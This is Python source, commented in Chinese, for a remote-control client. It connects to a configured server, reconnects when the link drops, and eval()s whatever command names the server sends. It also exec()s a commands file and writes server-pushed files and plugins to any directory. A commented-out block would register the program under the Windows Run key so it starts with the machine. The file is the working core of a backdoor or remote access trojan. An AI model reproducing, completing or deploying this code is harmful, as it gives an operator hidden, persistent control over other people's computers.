import socket,base64,json,os,threading,sys

# import win32api,win32con
#
# name='remote_control_client'
# if hasattr(sys, 'frozen'):
#     path=os.path.abspath(sys.executable)
#     KeyName='Software\Microsoft\Windows\CurrentVersion\Run'
#     key=win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,KeyName,0,win32con.KEY_ALL_ACCESS)
#     win32api.RegSetValueEx(key,name,0,win32con.REG_SZ,path)
#     win32api.RegCloseKey(key)
# else:
#     path=os.path.abspath(__file__)
# print(path)

mutex=threading.Lock()

#载入配置文件
with open('./client_configs/plugin_parser.json','r',encoding='utf-8') as f:
    plugin_parser=json.load(f)
with open('./client_configs/config.json','r',encoding='utf-8') as f:
    config=json.load(f)

with open('./client_configs/commands.py','r',encoding='utf-8') as f:
    t=f.read()
exec(t)

#客户端类
class ControlClient():
    def __init__(self,host,port):
        self.host=host
        self.port=port
        self.SOCKET=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.id=''
        self.cur_command=None
        self.cur_args=None
    #文件接收函数
    def recvFile(self):
        print('等待发送文件头...')
        header=json.loads(base64.b64decode(self.SOCKET.recv(1024)).decode(encoding='utf-8'))
        message=base64.b64encode('Data Received'.encode(encoding='utf-8'))
        self.SOCKET.sendall(message)
        print(header)
        print('接收到文件头！')

        if header['type']=='CONFIG':
            f=open(f'./client_configs/{header["name"]}.{header["ex"]}','wb')
        elif header['type']=='PLUGIN':
            if not os.path.exists('./plugins'):
                os.mkdir('./plugins')
            f=open(f'./plugins/{header["name"]}.{header["ex"]}','wb')
        elif header['type']=='FILE':
            if not os.path.exists(header['dst_dir']):
                os.mkdir(header['dst_dir'])
            f=open(f'{header["dst_dir"]}/{header["name"]}.{header["ex"]}','wb')
        else:
            f=open(f'{header["name"]}.{header["ex"]}','wb')

        print('开始接收文件...')
        recv_size=0
        while recv_size<header['size']:
            data=self.SOCKET.recv((1024**2)*16)
            print(len(data))
            recv_size+=len(data)
            f.write(data)
        f.close()
        print('文件接收完成')
    #连接检测函数
    def proveConnection(self):
        CONNECTION_CHECK_SOCKET=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            CONNECTION_CHECK_SOCKET.connect((self.host,self.port))

            request={'connection_type':'CONNECTION_CHECK_SOCKET','client_id':self.id}
            message=base64.b64encode(json.dumps(request).encode(encoding='utf-8'))
            CONNECTION_CHECK_SOCKET.sendall(message)

            while True:
                t=base64.b64decode(CONNECTION_CHECK_SOCKET.recv(1024)).decode(encoding='utf-8')
                if t=='Connection Check':
                    message=base64.b64encode('Connection Exists'.encode(encoding='utf-8'))
                    CONNECTION_CHECK_SOCKET.sendall(message)
        except ConnectionResetError as err:
            CONNECTION_CHECK_SOCKET.close()
            return
    #处理命令函数
    def handleCommand(self):
        print(self.cur_command)
        feedback=eval(self.cur_command)(self)
        message=base64.b64encode(json.dumps(feedback).encode(encoding='utf-8'))
        self.SOCKET.sendall(message)
        self.cur_command=None
        self.cur_args=None
    #连接服务端函数
    def connect(self):
        while True:
            self.SOCKET=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                print('正在连接中...')
                while True:
                    try:
                        self.SOCKET.connect((self.host,self.port))
                        print('连接成功！等待服务端响应...')
                        break
                    except Exception as err:
                        pass

                request={'connection_type':'MAIN_CLIENT','client_name':config['name']}
                message=base64.b64encode(json.dumps(request).encode(encoding='utf-8'))
                self.SOCKET.sendall(message)
                feedback=json.loads(base64.b64decode(self.SOCKET.recv(1024)).decode(encoding='utf-8'))
                threading.Thread(target=self.proveConnection).start()
                if feedback['status']=='Successfully Connected':
                    print('服务端响应完成！')
                    self.id=feedback['id']
                    print(self.id)
                    while True:
                        t=json.loads(base64.b64decode(self.SOCKET.recv(1024)).decode(encoding='utf-8'))
                        print(t)
                        self.cur_command=t['command']
                        self.cur_args=t['args']
                        self.handleCommand()
            except ConnectionResetError as err:
                print('连接断开，开始重新连接')
                self.SOCKET.close()

if __name__ == '__main__':
    client=ControlClient(config['host'],config['port'])
    client.connect()
